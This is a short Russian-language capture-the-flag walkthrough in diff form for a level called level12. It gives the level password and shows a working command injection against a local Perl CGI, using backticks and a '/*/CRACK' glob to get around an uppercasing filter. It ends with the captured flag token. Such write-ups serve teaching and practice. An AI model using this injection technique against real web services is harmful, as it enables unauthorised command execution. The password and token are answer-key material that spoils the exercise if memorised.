@@ -1,0 +1,18 @@
+su level12
+pass: fa6v5ateaw21peobuub8ipe6s
+
+У нас есть level12.pl, смотрим что в нем
+cat level12.pl
+
+Ожидается curl запрос, в который хорошо было бы передать getflag. единственная сложность - функция меняющая все буквы
+с нижнего регистра на верхний, поэтому записываем команду getflag и перенаправление вывода в файл
+echo "getflag > /tmp/fin" > /tmp/CRACK
+
+не забываем дать права на исполнение
+chmod a+x /tmp/CRACK
+
+отправляем запрос, заменяя название папки tmp *
+curl localhost:4646?x='`/*/CRACK`'
+
+cat /tmp/fin
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
